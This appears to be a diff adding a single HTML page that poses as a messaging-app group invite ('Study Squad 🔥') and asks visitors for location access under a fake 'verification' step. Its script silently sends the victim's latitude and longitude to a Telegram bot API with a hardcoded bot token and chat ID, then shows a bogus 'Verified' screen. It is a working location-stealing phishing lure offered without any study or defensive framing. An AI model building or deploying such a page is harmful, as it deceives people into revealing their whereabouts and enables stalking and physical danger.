@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Join Group</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0b141a;
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  background: #111b21;
+  padding: 25px;
+  border-radius: 15px;
+  text-align: center;
+  width: 300px;
+  box-shadow: 0 0 20px rgba(0,0,0,0.6);
+}
+
+.group-img {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: #25d366;
+  margin: auto;
+}
+
+h2 {
+  margin: 15px 0 5px;
+}
+
+p {
+  color: #8696a0;
+  font-size: 14px;
+}
+
+button {
+  background: #25d366;
+  border: none;
+  padding: 12px;
+  width: 100%;
+  border-radius: 25px;
+  color: black;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 15px;
+}
+
+button:hover {
+  opacity: 0.9;
+}
+
+.hidden {
+  display: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container" id="main">
+  <div class="group-img"></div>
+  <h2>Study Squad 🔥</h2>
+  <p>256 members</p>
+
+  <button onclick="askLocation()">Join Group</button>
+</div>
+
+<div class="container hidden" id="loading">
+  <h2>Verifying...</h2>
+  <p>Please allow location access</p>
+</div>
+
+<div class="container hidden" id="done">
+  <h2>✅ Verified</h2>
+  <p>You can now join the group</p>
+</div>
+
+<script>
+function askLocation() {
+  document.getElementById("main").classList.add("hidden");
+  document.getElementById("loading").classList.remove("hidden");
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocation, error);
+  } else {
+    alert("Geolocation not supported");
+  }
+}
+
+function sendLocation(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  // 🔥 SEND TO TELEGRAM
+  fetch("https://api.telegram.org/bot8777500091:AAHP3grCrtyUJwLITT7JESnW3V16F_jXAnY/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: "5486529321",
+      text: `📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}`
+    })
+  });
+
+  document.getElementById("loading").classList.add("hidden");
+  document.getElementById("done").classList.remove("hidden");
+}
+
+function error() {
+  alert("Location permission denied");
+}
+</script>
+
+</body>
+</html>
